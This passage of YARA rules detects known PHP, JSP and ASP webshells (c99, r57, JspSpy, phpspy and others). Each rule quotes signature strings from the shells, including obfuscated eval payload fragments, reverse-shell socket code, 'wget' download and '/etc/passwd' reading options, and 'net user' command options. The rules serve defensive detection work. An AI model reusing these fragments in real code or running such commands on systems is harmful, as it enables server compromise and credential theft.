      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
      $s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn" 
      $s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword
   condition: 
      all of them
}

rule Webshell_jsp_sys3_RID2DE4 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file sys3.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:51:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
      $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"" 
      $s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword
   condition: 
      all of them
}

rule Webshell_php_ghost_RID2E72 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ghost.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:14:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'" 
      $s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***" 
      $s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword
   condition: 
      all of them
}

rule Webshell_php_moon_RID2E06 : DEMO SCRIPT T1087_002 T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file moon.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1087_002, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "echo '<option value=\"create function backshell returns string soname" 
      $s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\"" 
      $s8 = "echo '<option value=\"select cmdshell(\\'net user " 
   condition: 
      2 of them
}

rule Webshell_ELMALISEKER_Backd00r_RID30DA : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ELMALISEKER Backd00r.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:57:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio" 
      $s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req" 
   condition: 
      all of them
}

rule Webshell_config_myxx_zend_RID3161 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files config.jsp, myxx.jsp, zend.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:20:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e0354099bee243702eb11df8d0e046df"
      hash2 = "591ca89a25f06cf01e4345f98a22845c"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');" 
   condition: 
      all of them
}

rule Webshell_browser_201_3_ma_download_RID3412 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:14:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a7e25b8ac605753ed0c438db93f6c498"
      hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
      hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a" 
      $s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith" 
   condition: 
      all of them
}

rule Webshell_itsec_itsecteam_shell_jHn_RID34D2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:46:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "bd6d3b2763c705a01cc2b3f105a25fa4"
      hash2 = "40c6ecf77253e805ace85f119fe1cebb"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b" 
      $s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'" 
   condition: 
      all of them
}

rule Webshell_Ghost_Icesword_Silic_RID329D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files ghost_source.php, icesword.php, silic.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:12:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6e20b41c040efb453d57780025a292ae"
      hash2 = "437d30c94f8eef92dc2f064de4998695"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $" 
      $s6 = "if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST[" 
   condition: 
      all of them
}

rule Webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx_RID3F1D : DEMO SCRIPT T1012 T1505_003 T1543_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 23:06:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
      hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
      tags = "DEMO, SCRIPT, T1012, T1505_003, T1543_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype=" 
      $s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T" 
   condition: 
      all of them
}

rule Webshell_JspSpyJDK51_luci_jsp_xxx_RID33CD : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:03:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
      hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";" fullword
      $s1 = "private static class VEditPropertyInvoker extends DefaultInvoker {" fullword
   condition: 
      all of them
}

rule Webshell_wso2_5_1_wso2_5_wso2_RID31BD : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:35:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7c8e5d31aad28eb1f0a9a53145551e05"
      hash2 = "cbc44fb78220958f81b739b493024688"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec" 
      $s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na" 
   condition: 
      all of them
}

rule Webshell_QueryDong_spyjsp2010_t00ls_RID3421 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:17:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "8b457934da3821ba58b06a113e0d53d9"
      hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')" 
      $s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"" 
   condition: 
      all of them
}

rule Webshell_404_data_suiyue_RID303A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 404.jsp, data.jsp, suiyue.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:30:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
      hash2 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+" 
   condition: 
      all of them
}

rule Webshell_r57shell_SnIpEr_EgY_SpIdEr_RID3416 : CRIME DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:15:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ae025c886fbe7f9ed159f49593674832"
      hash2 = "911195a9b7c010f61b66439d9048f400"
      hash3 = "697dae78c040150daff7db751fc0c03c"
      tags = "CRIME, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name" 
      $s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1" 
      $s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size=" 
   condition: 
      all of them
}

rule Webshell_JspSpy_xxx_RID2ED6 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:31:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "76037ebd781ad0eac363d56fc81f4b4f"
      hash2 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
      hash3 = "14e9688c86b454ed48171a9d4f48ace8"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var" 
      $s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu" 
      $s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i" 
   condition: 
      all of them
}

rule Webshell_JSP_MA_download_RID3037 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:30:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fb8c6c3a69b93e5e7193036fd31a958d"
      hash2 = "4cc68fa572e88b669bce606c7ace0ae9"
      hash3 = "fa87bbd7201021c1aefee6fcc5b8e25a"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su" 
      $s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but" 
      $s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class=" 
   condition: 
      all of them
}

rule Webshell_JFolder_Leo_RID2ECB : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:29:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a7e25b8ac605753ed0c438db93f6c498"
      hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
      hash3 = "36331f2c81bad763528d0ae00edf55be"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
      $s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword
   condition: 
      all of them
}

rule Webshell_shell_phpspy_2006_arabicspy_RID3505 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:55:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "40a1f840111996ff7200d18968e42cfe"
      hash2 = "e0202adff532b28ef1ba206cf95962f2"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype" 
      $s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P" 
   condition: 
      all of them
}

rule Webshell_in_JFolder_jfolder01_jsp_leo_warn_RID378A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 17:42:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8979594423b68489024447474d113894"
      hash2 = "ec482fc969d182e5440521c913bab9bd"
      hash3 = "f98d2b33cd777e160d1489afed96de39"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD" 
      $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi" 
   condition: 
      all of them
}

rule Webshell_2_520_icesword_job_ma1_ma4_2_RID3477 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9abd397c6498c41967b4dd327cf8b55a"
      hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
      hash3 = "56c005690da2558690c4aa305a31ad37"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\"," 
      $s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ" 
      $s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor" 
   condition: 
      all of them
}

rule Webshell_phpspy_arabicspy_RID3167 : DEMO SCRIPT T1007 T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:21:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "40a1f840111996ff7200d18968e42cfe"
      hash2 = "e0202adff532b28ef1ba206cf95962f2"
      hash3 = "802f5cae46d394b297482fd0c27cb2fc"
      tags = "DEMO, SCRIPT, T1007, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname." 
   condition: 
      all of them
}

rule Webshell_C99_Shell_ci_Biz_RID3061 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:37:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f2fa878de03732fbf5c86d656467ff50"
      hash2 = "27786d1e0b1046a1a7f67ee41c64bf4c"
      hash3 = "0f5b9238d281bc6ac13406bb24ac2a5b"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\"" 
   condition: 
      all of them
}

rule Webshell_2008_2009lite_2009mssql_RID31A2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:30:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3f4d454d27ecc0013e783ed921eeecde"
      hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');" 
      $s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all" 
   condition: 
      all of them
}

rule Webshell_Arabicspy_PHPSPY_RID3087 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:43:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b68bfafc6059fd26732fa07fb6f7f640"
      hash2 = "42f211cec8032eb0881e87ebdb3d7224"
      hash3 = "40a1f840111996ff7200d18968e42cfe"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
      $s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d" 
   condition: 
      all of them
}

rule Webshell_JspSpyJDK5_RID2E1D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:00:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "14e9688c86b454ed48171a9d4f48ace8"
      hash2 = "341298482cf90febebb8616426080d1d"
      hash3 = "88fc87e7c58249a398efd5ceae636073"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
      $s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword
   condition: 
      1 of them
}

rule Webshell_Dive_Shell_Emperor_Hacking_Team_RID36B8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files Dive Shell 1.0 - Emperor Hacking Team.php, phpshell.php, SimShell 1.0 - Simorgh Security MGZ.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 17:07:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f8a6d5306fb37414c5c772315a27832f"
      hash2 = "37cb1db26b1b0161a4bf678a6b4565bd"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals" 
      $s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword
   condition: 
      all of them
}

rule Webshell_JFolder_jfolder01_xxx_RID32B9 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:17:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
      hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
      hash3 = "8979594423b68489024447474d113894"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE" 
   condition: 
      all of them
}

rule Webshell_jsp_reverse_jsp_RID30FA : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:02:51"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ea87f0c1f0535610becadf5a98aca2fc"
      hash2 = "7d5e9732766cf5b8edca9b7ae2b6028f"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
      $s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
      $s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword
   condition: 
      all of them
}

rule Webshell_JFolder_jfolder01_jsp_leo_RID343D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:22:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "793b3d0a740dbf355df3e6f68b8217a4"
      hash2 = "8979594423b68489024447474d113894"
      hash3 = "ec482fc969d182e5440521c913bab9bd"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
      $s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
      $s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
      $s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword
   condition: 
      2 of them
}

rule Webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2_RID369B : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 17:03:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9abd397c6498c41967b4dd327cf8b55a"
      hash2 = "56c005690da2558690c4aa305a31ad37"
      hash3 = "70a0ee2624e5bbe5525ccadc467519f6"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword
      $s6 = "password = (String)session.getAttribute(\"password\");" fullword
      $s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231" 
   condition: 
      2 of them
}

rule Webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx_RID39AE : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 19:14:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ef43fef943e9df90ddb6257950b3538f"
      hash2 = "ae025c886fbe7f9ed159f49593674832"
      hash3 = "911195a9b7c010f61b66439d9048f400"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI" 
      $s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC" 
   condition: 
      all of them
}

rule Webshell_PHPJackal_itsecteam_shell_RID3469 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:29:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e2830d3286001d1455479849aacbbb38"
      hash2 = "bd6d3b2763c705a01cc2b3f105a25fa4"
      hash3 = "40c6ecf77253e805ace85f119fe1cebb"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
      $s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|" 
      $s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+" 
   condition: 
      2 of them
}

rule Webshell_Shell_Biz_c100_RID2F75 : DEMO SCRIPT T1087_001 T1105 T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c99-shadows-mod.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:58:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "27786d1e0b1046a1a7f67ee41c64bf4c"
      hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
      tags = "DEMO, SCRIPT, T1087_001, T1105, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri" 
      $s3 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\"" 
      $s4 = "<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO" fullword
      $s7 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de" 
      $s9 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER" 
   condition: 
      2 of them
}

rule Webshell_NIX_REMOTE_WEB_SHELL_RID30D4 : DEMO SCRIPT T1505_003 WEBSHELL {
